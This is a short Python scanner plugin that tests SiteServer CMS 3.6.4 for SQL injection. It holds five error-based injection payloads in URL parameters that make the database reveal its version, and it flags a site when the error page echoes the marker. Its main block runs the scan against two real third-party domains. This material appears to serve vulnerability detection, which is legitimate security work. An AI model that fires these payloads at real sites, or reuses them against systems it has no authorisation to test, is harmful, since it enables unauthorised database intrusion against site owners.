#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:siteserver最新版3.6.4 sql inject漏洞大礼包of 3
#Refer:http://www.wooyun.org/corps/%E7%99%BE%E5%AE%B9%E5%8D%83%E5%9F%9F%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/page/2


def assign(service,arg):
    if service=="siteserver":
        return True,arg 


def  audit(arg):
    ps=[
        'siteserver/cms/background_contentsGroup.aspx?publishmentSystemID=1&contentGroupName=test%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271',
        'siteserver/cms/modal_contentTagAdd.aspx?PublishmentSystemID=2109&TagName=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271',
        'siteserver/UserRole/background_userAdd.aspx?UserName=yjfjnpuc%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271&ReturnUrl=../cms/console_user.aspx',
        'siteserver/cms/modal_contentGroupAdd.aspx?PublishmentSystemID=2222&GroupName=123%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%271',
        'siteserver/UserRole/modal_UserView.aspx?Username=d%27%20or[areaid]>char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--'
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        
        if code==500 and "GAOJIMicrosoft" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('siteserver','http://www.plhgyy.com/')[1])
    audit(assign('siteserver','http://www.zgktws.com/')[1])